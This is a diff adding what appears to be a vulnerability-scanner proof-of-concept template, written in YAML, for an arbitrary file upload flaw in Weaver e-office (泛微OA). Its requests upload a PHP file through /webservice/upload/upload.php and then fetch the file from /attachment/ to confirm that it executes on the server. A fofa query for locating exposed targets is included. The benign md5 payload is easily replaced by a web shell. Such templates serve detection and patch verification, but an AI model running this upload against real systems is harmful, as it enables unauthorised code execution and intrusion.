@@ -1,0 +1,36 @@
+id: poc-yaml-weaver-e-office-webservice-anyfile-upload
+info:
+  name: 泛微OA e-office webservice 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: e-office
+  fofa: body="eoffice"
+variables:
+  t1: random_str(8)
+  t2: random_int(1000,10000)
+  t3: md5(t2)
+requests:
+- method: POST
+  path: /webservice/upload/upload.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.t1}}
+  data: '------WebKitFormBoundary{{.t1}}
+
+    Content-Disposition: form-data; name="file"; filename="{{.t2}}.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5({{.t2}});?>
+
+    ------WebKitFormBoundary{{.t1}}--'
+  expression: "status_code == 200 && \ncontains(body,\".php\") &&\n!contains(body,\"\
+    <\")\n"
+  output:
+  - regex_match(body,`(?P<id>[0-9]{7,12})`)
+- method: GET
+  path: /attachment/{{.id}}/{{.t2}}.php
+  expression: status_code == 200 && body == t3
+transport: http
